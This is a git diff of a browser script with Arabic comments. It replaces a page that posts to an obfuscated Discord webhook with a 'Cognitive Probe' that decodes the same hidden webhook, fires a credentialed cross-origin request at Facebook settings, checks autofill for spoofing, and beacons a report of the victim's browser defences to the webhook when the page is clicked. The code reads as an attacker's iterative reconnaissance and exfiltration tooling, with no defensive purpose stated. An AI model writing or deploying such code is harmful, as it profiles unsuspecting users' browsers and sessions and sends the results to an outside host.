@@ -1,52 +1,46 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V40 FINAL</title>
-    <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #0f0; }
-    </style>
-</head>
-<body>
+/**
+ * V41: The "Cognitive Probe" Script
+ * هذا السكريبت بيحلل دفاعات المتصفح وفيسبوك بالملي
+ */
 
-    <h1 onclick="launch()">40</h1>
+const HOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==");
 
-    <script>
-        // الرابط تبعك شفرته لك داخل الكود عشان يشتغل "على طول"
-        const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
+async function analyzeSecurity() {
+    let report = "🔍 **Deep System Analysis (V41):**\n";
 
-        function launch() {
-            const url = atob(key);
-            document.querySelector('h1').innerText = "...";
+    // 1. فحص حماية الكوكيز (CORS & SameSite)
+    try {
+        let fbCheck = await fetch("https://m.facebook.com/settings", { mode: 'no-cors', credentials: 'include' });
+        report += "✅ Browser allowed Cross-Origin probe (Vulnerable to Tunneling)\n";
+    } catch(e) {
+        report += "❌ Browser blocked Cross-Origin cookies (Strict Sandboxing active)\n";
+    }
 
-            // إرسال عبر فورم مخفي (أنجح طريقة طلعت في تجاربنا)
-            const f = document.createElement('form');
-            f.action = url;
-            f.method = 'POST';
-            f.target = 'v40_frame';
-            
-            const i = document.createElement('input');
-            i.name = 'content';
-            i.value = "🎯 **V40 MISSION SUCCESS!**\nDirect Link Decrypted & Sent.";
-            
-            f.appendChild(i);
-            document.body.appendChild(f);
-            
-            const ifr = document.createElement('iframe');
-            ifr.name = 'v40_frame';
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
+    // 2. فحص الـ Autofill Privacy
+    const input = document.createElement('input');
+    input.setAttribute('autocomplete', 'email');
+    if (input.autocomplete === 'email') {
+        report += "📱 Autofill Handlers: Detected (Can be spoofed via Layer 2)\n";
+    }
 
-            f.submit();
+    // 3. فحص الـ Outbound Filter (هل ديسكورد محظور؟)
+    const startTime = Date.now();
+    fetch(HOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({content: "📡 Testing Latency..."})})
+    .then(() => {
+        let latency = Date.now() - startTime;
+        report += `📡 Discord Webhook Status: **REACHABLE** (${latency}ms)\n`;
+        sendFinalReport(report);
+    })
+    .catch(() => {
+        report += "🚫 Discord Webhook Status: **BLOCKED BY ISP/BROWSER**\n";
+        sendFinalReport(report);
+    });
+}
 
-            // تأكيد بصري
-            setTimeout(() => {
-                document.querySelector('h1').innerText = "DONE";
-                document.querySelector('h1').style.color = "#0f0";
-            }, 500);
-        }
-    </script>
-</body>
-</html>
+function sendFinalReport(msg) {
+    // إرسال التقرير النهائي للديسكورد
+    navigator.sendBeacon(HOOK, JSON.stringify({ content: msg }));
+}
+
+// تنفيذ الفحص بمجرد لمس الشاشة
+document.body.onclick = analyzeSecurity;
